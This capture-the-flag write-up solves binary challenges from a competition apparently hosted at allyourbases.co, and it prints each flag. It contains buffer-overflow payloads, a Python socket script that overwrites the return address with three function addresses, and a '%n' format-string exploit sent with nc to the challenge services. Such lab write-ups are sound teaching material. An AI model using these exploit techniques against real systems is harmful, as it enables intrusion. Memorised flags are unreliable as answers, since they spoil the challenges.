# BE01
```
Download the file at https://ggcs-files.allyourbases.co/be01.zip and find a way to get the flag from the program.
```
Simply running strings on the file will get us our flag!

![Simple strings](/images/BE01.png)

Flag: sTriNGS-r-EZ-7819

# BE02
```
Download the file at https://ggcs-files.allyourbases.co/be02.zip and find out what the program does to get the flag.
```
We are given some c code, so we can compile this all with `gcc`. Command used is:`gcc program.c -o program`.
And then simply running the generated ELF gives us the flag.

![Using gcc](/images/BE02.png)

Flag: c0mpILE-tIME_1822

# BM01
```
Download the file at https://ggcs-files.allyourbases.co/bm01.zip and figure out how to exploit the program.

Once you obtain the placeholder flag through exploitation prove your work by sending the same exploit to the network service at ggcs-bm01.allyourbases.co port 8134 to get the flag.
```

We can use `gdb program` to figure out what the program is doing.
We use `info func` to view functions, and `disas main` to see the assembly.
There is an interesting line which is
```
0x000006d6 <+153>:   cmp    BYTE PTR [ebp-0x9],0x62
```
This compares the byte at `ebp-0x9` with `0x62`, which is "b".
After a bit of experimentation, I was able to get the sample flag on local by adding 50 * "a" and then adding a "b" on the end.
We can do the same on the remote to get the flag.

Final payload: `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAb`

Flag: c0MinG-Up_bs-8788

# BH01
```
Download the file at https://ggcs-files.allyourbases.co/bh01.zip and find a way to extract the flag.

Note that the flag must be submitted as 'normal' text which you might read in a book.
```
If we open the file up in a hex editor, we see the word flag, but there doesn't appear to be anything after it at first.
However, by accident, I figured that if you try copy the hex into a text file, it appears to be some text in English, however it was upside down.
We convert this to normal English, keeping the capitalization to get the flag.

Flag: inSIDEoUT

# BH02
```
Download the files at https://ggcs-files.allyourbases.co/bh02.zip and figure out how to exploit the program.

Once you obtain the placeholder flag through exploitation prove your work by sending the same exploit to the network service at ggcs-bh02.allyourbases.co port 8133 to get the flag.
```
Again, we open this up in `gdb`
We can see again, there is that line that compares bytes.
```
   0x00000744 <+215>:   cmp    BYTE PTR [ebp-0x9],0x66
```
0x66 is "f" in ASCII, but I wasn't able to get the placeholder flag, so I looked again.
It appears that we also need to add a ":)" before our f, and so I kept trying, eventually getting the sample flag.

Final payload: `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:)f`

Flag: caNaRY-CoalMINE-2811

# BH03
```
Access the network service at ggcs-bh03.allyourbases.co port 1337 and follow the instructions it gives you to obtain the flag.
```
When we connect with `nc ggcs-bh03.allyourbases.co 1337`, we can see it wants us to call 3 functions.
This is a simple ROPchain task, where we overwrite the EIP register 3 times. 
To call the functions, we need padding so that we can overwrite things, and then we include the addresses of the functions.
I wrote a script to do this for me.
```
import socket
import struct
p32 = lambda x : struct.pack('I', x)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('ggcs-bh03.allyourbases.co', 1337))
print(s.recv(1024))
a = s.recv(1024)
b = a.split("\n")
x = int((b[4].split(": "))[1],16)
y = int((b[3].split(": "))[1],16)
z = int((b[2].split(": "))[1],16)
payload = "A" * 45 + p32(x) + p32(y) + p32(z) + "\n"
print(payload)
s.send(payload)
print(s.recv(1024))
print(s.recv(1024))
print(s.recv(1024))
```
Running the script gives us 3 strings.
```
PTi0xOTkw
UVE9mdW5jVGl
RmxhZzogUmV
```
If we put these in reverse order and base64 decode, we get the flag.

Flag: ReTTOfuncTiON-1990

# BX01
```
Access the network service at ggcs-bx01.allyourbases.co port 9171 and find a way to exploit it to get the flag.
```
For this challenge, we need to get the value from 1337 to 1. 
We can do this with a format string, specifically `%n`
Doing it once on the remote by sending `a%n` gives us the output
```
Object validated, contents is 'Rig'
```
So we just need to do this multiple times to get the flag.
The number ended up being 14 times.
```
python -c "print 'A'+'%n'*14" | nc ggcs-bx01.allyourbases.co 9171
```

Flag: tRUNkated-EveRYTHinG-6761
